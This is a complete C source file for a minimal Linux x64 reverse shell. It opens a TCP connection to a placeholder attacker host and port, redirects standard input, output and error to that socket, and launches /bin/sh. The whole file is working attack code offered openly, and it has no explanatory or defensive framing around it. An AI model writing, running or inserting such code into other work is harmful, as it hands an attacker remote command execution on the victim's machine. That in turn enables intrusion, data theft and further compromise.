/*
reverse_shell_linux_x64.c

Minimal Linux x64 reverse shell in C:
- Connects back to LHOST_PLACEHOLDER:LPORT_PLACEHOLDER
- Replaces stdin/stdout/stderr and spawns /bin/sh
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(void) {
    int sockfd;
    struct sockaddr_in servaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons( LPORT_PLACEHOLDER );
    servaddr.sin_addr.s_addr = inet_addr("LHOST_PLACEHOLDER");

    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        return 1; // Could not connect
    }

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execl("/bin/sh", "sh", NULL);
    return 0;
}
